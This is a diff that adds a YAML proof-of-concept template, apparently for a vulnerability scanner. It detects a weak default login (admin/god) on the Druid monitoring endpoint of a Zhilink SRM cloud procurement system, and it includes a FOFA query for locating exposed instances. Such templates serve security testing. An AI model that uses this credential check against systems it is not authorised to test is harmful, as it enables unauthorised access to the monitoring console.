@@ -1,0 +1,18 @@
+id: poc-yaml-zhilink-srm-adpweb-druid-login
+info:
+  name: SRM智联云采系统 /adpweb/druid/submitLogin 弱口令漏洞
+  severity: medium
+  tags:
+  - 弱口令
+  finger: srm
+  fofa: title=="SRM 2.0"
+requests:
+- method: POST
+  path: /adpweb/druid/submitLogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: loginUsername=admin&loginPassword=god
+  expression: "status_code == 200 && \nbody == \"success\" &&\ncontains(headers,\"\
+    zhilink.session.id=\") &&\ncontains(headers,\"Path=/adpweb\")\n"
+variables: {}
+transport: http
